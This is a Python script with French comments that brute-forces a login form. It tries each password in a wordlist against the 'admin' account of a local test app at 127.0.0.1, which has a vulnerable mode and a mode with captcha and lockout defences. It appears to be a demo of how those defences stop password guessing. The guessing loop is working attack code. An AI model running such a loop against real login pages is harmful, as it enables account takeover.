import requests
import time
from pathlib import Path
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn

# CONFIGURATION
MODE = "vuln"        
#MODE = "secure"     

TARGET_URL = f"http://127.0.0.1:5000/?mode={MODE}" if MODE == "vuln" else "http://127.0.0.1:5000/" 

USERNAME = "admin"
WORDLIST_PATH = Path("passwords.txt")

MAX_ATTEMPTS = 5

SHOW_ATTEMPT_EVERY = 5

SUCCESS_PHRASES = [
    "connexion réussie",
    "connexion reussie",
    "succès:"
]

FAILURE_PHRASES = [
    "captcha_required",
    "veuillez remplir le captcha",
    "wrong_captcha",
    "vérification captcha incorrecte",
    "account_locked",
    "compte verrouillé",
    "trop de tentatives",
    "remplir",
    "nombre valide",
    "réessayez",
    "incorrect"
]

# INITIALISATION
console = Console()

def load_wordlist(path: Path) -> list[str]:
    if not path.is_file():
        console.print(f"[bold red]Erreur :[/bold red] Le fichier {path} n'existe pas")
        exit(1)
    try:
        return [line.strip() for line in path.read_text(encoding="utf-8", errors="ignore").splitlines() 
                if line.strip()]
    except Exception as e:
        console.print(f"[bold red]Erreur lecture fichier :[/bold red] {e}")
        exit(1)

def is_successful(response: requests.Response) -> bool:
    """Détection stricte : succès + PAS d'erreur ni CAPTCHA ni lockout"""
    text = response.text.lower()
    text = text.replace("é", "e").replace("è", "e").replace("ê", "e").replace(" ", "").replace("\n", "").replace("\r", "")
    
    has_success = any(phrase.replace(" ", "") in text for phrase in SUCCESS_PHRASES)
    
    has_failure = any(word in text for word in FAILURE_PHRASES)
    
    return has_success and not has_failure

# PROGRAMME PRINCIPAL
def main():
    passwords = load_wordlist(WORDLIST_PATH)
    total = len(passwords)
    
    # Banner
    console.print("""
[bold green]██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ [/bold green]
[bold green]██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      [/bold green]
[bold green]██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   [/bold green]
[bold green]██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      [/bold green]
[bold green]██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████ [/bold green]
    """.strip() + "\n")
    
    console.print(f"[cyan]Cible :[/cyan]          {TARGET_URL}")
    console.print(f"[cyan]Etat du cible :[/cyan]    {'VULNÉRABLE ' if MODE == 'vuln' else 'contre mesures actives'}")
    console.print(f"[cyan]Utilisateur :[/cyan]     {USERNAME}")
    console.print(f"[cyan]Wordlist :[/cyan]        {WORDLIST_PATH.name} ({total:,} entrées)\n")
    
    if total == 0:
        console.print("[yellow]Liste vide...[/yellow]")
        return

    session = requests.Session()
    found_password = None
    found_attempt = 0
    start_time = time.time()
    security_blocked = False
    security_type = None
    attempted = 0

    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeElapsedColumn(),
        transient=True
    ) as progress:
        
        task = progress.add_task("[bold green]BRUTEFORCE EN COURS...[/bold green]", total=total)
        
        for i, password in enumerate(passwords, 1):
            attempted = i
            
            if security_blocked:
                progress.advance(task)
                continue

            try:
                # En mode secure : n'envoie PAS de captcha (c'est intentionnel pour être bloqué)
                data = {"username": USERNAME, "password": password}
                
                r = session.post(
                    TARGET_URL,
                    data=data,
                    timeout=5,
                    allow_redirects=False  # détecter les redirections
                )
                
                # Détection de blocage sécurité
                text_lower = r.text.lower()
                if any(word in text_lower for word in ["captcha_required", "veuillez remplir", "wrong_captcha", "vérification captcha", "account_locked", "compte verrouillé"]):
                    security_blocked = True
                    security_type = "CAPTCHA ou lockout détecté"
                    break
                
                # Succès réel ?
                if is_successful(r):
                    found_password = password
                    found_attempt = i
                    break
                
                # Affichage des tentatives
                if i % SHOW_ATTEMPT_EVERY == 0:
                    console.print(
                        f"  [{i:4d}/{total:4d}]  {password:20}",
                        style="dim"
                    )
                    
                # En mode secure, on s'arrête vite (simulation lockout)
                if MODE == "secure" and i >= MAX_ATTEMPTS:
                    security_blocked = True
                    security_type = "Simulation lockout après 5 tentatives"
                    console.print(f"[yellow]⏹️  Arrêt démo : lockout simulé après {i} tentatives[/yellow]")
                    break
                    
            except requests.RequestException as e:
                console.print(f"[yellow]Erreur réseau tentative {i}: {str(e)[:50]}...[/yellow]")
            
            progress.advance(task)
    
    console.print("\n" + "─" * 60)
    
    if found_password:
        console.print(f"[bold green]✓ MOT DE PASSE TROUVÉ ![/bold green]")
        console.print(f"  Username : {USERNAME}")
        console.print(f"  Password : [bold green]{found_password}[/bold green]")
        console.print(f"  Trouvé à la tentative : {found_attempt}/{total}")
        console.print(f"  Temps total : {time.time() - start_time:.2f}s")
            
    elif security_blocked:
        console.print(f"[bold red]✗ ATTENTE BLOQUÉE PAR LA SÉCURITÉ[/bold red]")
        console.print(f"  Type de sécurité : {security_type}")
        console.print(f"  Tentatives avant blocage : {attempted}/{total}")
        console.print(f"  Temps total : {time.time() - start_time:.2f}s")
     
    else:
        console.print("[bold red]✗ Échec - Aucun mot de passe valide trouvé[/bold red]")
        console.print(f"  Tentatives effectuées : {attempted}/{total}")
        console.print(f"  Temps total : {time.time() - start_time:.2f}s")
        
        if MODE == "secure":
            console.print("   Le script a été bloqué avant de trouver le mot de passe.")
    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]Arrêt par l'utilisateur (Ctrl+C)[/yellow]")
    except Exception as e:
        console.print(f"\n[bold red]Erreur :[/bold red] {e}")